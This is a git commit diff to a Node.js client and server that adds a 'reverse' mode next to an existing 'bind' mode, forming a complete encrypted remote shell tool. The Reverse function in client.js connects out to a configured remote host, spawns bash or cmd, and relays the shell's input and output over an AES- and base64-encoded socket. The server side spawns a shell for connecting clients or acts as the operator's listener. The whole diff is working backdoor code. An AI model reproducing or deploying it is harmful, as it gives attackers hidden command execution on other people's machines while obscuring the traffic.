bebbc1df558ac837706146f8982a3a7f53a9ffc8
timebotdon <choyyld@gmail.com>
2022-06-18 22:55:54 +0800

    add/integrate reverse mode

--- client.js
+++ client.js
@@ -1,6 +1,6 @@
-//const { spawn } = require("child_process")
 const { createConnection } = require("net");
 const { createInterface } = require("readline")
+const { spawn } = require("child_process")
 const { b64coder, CryptorAES } = require('./crypt')
 const {remote_address, remote_port, aes_password, aes_iv} = require('./client_config.json')
 
@@ -16,10 +16,13 @@ https.get("https://ifconfig.me", {
   res.pipe(process.stdout);
 }); */
 
-
 const b64 = new b64coder()
 const crypt = new CryptorAES(aes_password, aes_iv)
 
+const config = {
+    host: remote_address,
+    port: remote_port
+}
 
 function translate_out(cleartext){
     const encodedData = b64.encode_b64(cleartext.toString())
@@ -33,48 +36,111 @@ function translate_in(ciphertext){
     return(decodedData)
 }
 
-const config = {
-    host: remote_address,
-    port: remote_port
+function Bind (){
+    const client = createConnection(config, () => {
+        const int = createInterface({
+            input: process.stdin,
+            output: process.stdout,
+            prompt: ""
+        })
+    
+        int.on("line", (data) => {
+            client.write(translate_out(data))
+        })
+    
+        int.on("SIGINT", () => {
+            client.end()
+        })
+    
+        client.on("data", (data) => {
+            console.log(translate_in(data))
+        });
+         
+        client.on("connect", (data) => {
+             console.log("Connect Success")
+        })
+         
+        client.on("error", (data) => {
+            switch(data.code){
+                case "ECONNRESET":
+                    console.log("Server connection reset.")
+                    process.exit(1)
+                    break
+                default:
+                    console.log(data)
+                    break
+            }
+         })
+         
+        client.on("end", () => { 
+            console.log("disconnected from server");
+            process.exit(0)
+        });
+    });
 }
 
-const client = createConnection(config, () => {
-    const int = createInterface({
-        input: process.stdin,
-        output: process.stdout,
-        prompt: ""
-    })
-
-    int.on("line", (data) => {
-        client.write(translate_out(data))
-    })
-
-    int.on("SIGINT", () => {
-        client.end()
-    })
-
-    client.on("data", (data) => {
-        console.log(translate_in(data))
-    });
-     
-    client.on("connect", (data) => {
-         console.log("Connect Success")
-    })
-     
-    client.on("error", (data) => {
-        switch(data.code){
-            case "ECONNRESET":
-                console.log("Server connection reset.")
-                process.exit(1)
+function Reverse (){
+    const client = createConnection(config, () => {
+        let shellcmd = undefined
+        switch(process.platform){
+            case "linux":
+                shellcmd = "bash"
                 break
-            default:
-                console.log(data)
+            case "android":
+                shellcmd = "bash"
+                break
+            case "win32":
+                shellcmd = "cmd"
                 break
         }
-     })
-     
-    client.on("end", () => { 
-        console.log("disconnected from server");
-        process.exit(0)
+    
+        const shell = spawn(shellcmd)
+    
+        // shell stdout to client
+        shell.stdout.on("data", (data) => {
+            client.write(translate_out(data))
+        })
+    
+        shell.stderr.on("data", (error) => {
+            client.write(translate_out(error))
+        })
+    
+        shell.on("exit", () => {
+            process.exit(0)
+        })
+    
+        client.on("data", (data) => {
+            shell.stdin.write(`${translate_in(data)}\n`)
+        })
+    
+         
+        client.on("error", (data) => {
+            switch(data.code){
+                case "ECONNRESET":
+                    process.exit(1)
+                default:
+                    console.log(data)
+                    process.exit(1)
+            }
+         })
+         
+        client.on("end", () => { 
+            process.exit(0)
+        });
     });
-});
+}
+
+switch(process.argv[2]){
+    case "b":
+        Bind()
+        break
+    case "r":
+        Reverse()
+        break
+    default:
+        console.log("Define an operating mode!")
+        console.log("usage:")
+        console.log("node client r (Reverse connection)")
+        console.log("node client b (Bind connection)")
+        process.exit(1)
+}
--- server.js
+++ server.js
@@ -1,10 +1,17 @@
 const { createServer } = require("net")
+const { createInterface } = require("readline")
 const { spawn } = require("child_process")
 const { CryptorAES, b64coder } = require('./crypt')
 const {listen_address, listen_port, aes_password, aes_iv} = require('./server_config.json')
 
 const b64 = new b64coder()
 const crypt = new CryptorAES(aes_password, aes_iv)
+
+const config = {
+    host: listen_address,
+    port: listen_port,
+    exclusive: true
+}
 
 function translate_out(cleartext){
     const encodedData = b64.encode_b64(cleartext.toString())
@@ -18,58 +25,104 @@ function translate_in(ciphertext){
     return(decodedData)
 }
 
-const server = createServer((socket) => {
+function Bind(){
+    const server = createServer((socket) => {
 
-    let shellcmd = undefined
-    switch(process.platform){
-        case "linux":
-            shellcmd = "bash"
-            break
-        case "android":
-            shellcmd = "bash"
-            break
-        case "win32":
-            shellcmd = "cmd"
-            break
-    }
-
-    const shell = spawn(shellcmd)
-    console.log("INFO:client connected")
-    socket.write(translate_out("Connected to remote host"))
-
-    // shell stdout to client
-    shell.stdout.on("data", (data) => {
-        socket.write(translate_out(data))
+        let shellcmd = undefined
+        switch(process.platform){
+            case "linux":
+                shellcmd = "bash"
+                break
+            case "android":
+                shellcmd = "bash"
+                break
+            case "win32":
+                shellcmd = "cmd"
+                break
+        }
+    
+        const shell = spawn(shellcmd)
+        console.log("INFO:client connected")
+        socket.write(translate_out("Connected to remote host"))
+    
+        // shell stdout to client
+        shell.stdout.on("data", (data) => {
+            socket.write(translate_out(data))
+        })
+    
+        shell.stderr.on("data", (error) => {
+            socket.write(translate_out(error))
+        })
+    
+        shell.on("exit", () => {
+            console.log("INFO:client closed the shell")
+            process.exit(0)
+        })
+    
+        socket.on("data", (data) => {
+            shell.stdin.write(`${translate_in(data)}\n`)
+        })
+    
+        socket.on("error", (err) => {
+            console.log(`ERROR:${err}`)
+        })
+    
+        socket.on("end", () => {
+            console.log("INFO:client disconnected")
+        })
     })
-
-    shell.stderr.on("data", (error) => {
-        socket.write(translate_out(error))
-    })
-
-    shell.on("exit", () => {
-        console.log("INFO:client closed the shell")
-        process.exit(0)
-    })
-
-    socket.on("data", (data) => {
-        shell.stdin.write(`${translate_in(data)}\n`)
-    })
-
-    socket.on("error", (err) => {
-        console.log(`ERROR:${err}`)
-    })
-
-    socket.on("end", () => {
-        console.log("INFO:client disconnected")
-    })
-})
-
-const config = {
-    host: listen_address,
-    port: listen_port,
-    exclusive: true
+    
+    server.listen(config, () => {
+        console.log(`INFO:Listening on ${listen_address}:${listen_port}`);
+    });
 }
 
-server.listen(config, () => {
-    console.log(`INFO:Listening on ${listen_address}:${listen_port}`);
-});
+function Reverse(){
+    const server = createServer((socket) => {
+        console.log("INFO:client connected")
+    
+        const int = createInterface({
+            input: process.stdin,
+            output: process.stdout,
+            prompt: ""
+        })
+    
+        int.on("line", (data) => {
+            socket.write(translate_out(data))
+        })
+    
+        int.on("SIGINT", () => {
+            socket.end()
+            process.exit(0)
+        })
+    
+        socket.on("data", (data) => {
+            console.log(`${translate_in(data)}`)
+        })
+    
+        socket.on("error", (err) => {
+            console.log(`ERROR:${err}`)
+        })
+    })
+    
+    server.listen(config, () => {
+        console.log(`INFO:Listening on ${listen_address}:${listen_port}`);
+    });
+    
+}
+
+
+switch(process.argv[2]){
+    case "b":
+        Bind()
+        break
+    case "r":
+        Reverse()
+        break
+    default:
+        console.log("Define an operating mode!")
+        console.log("usage:")
+        console.log("node server r (Reverse connection)")
+        console.log("node server b (Bind connection)")
+        process.exit(1)
+}
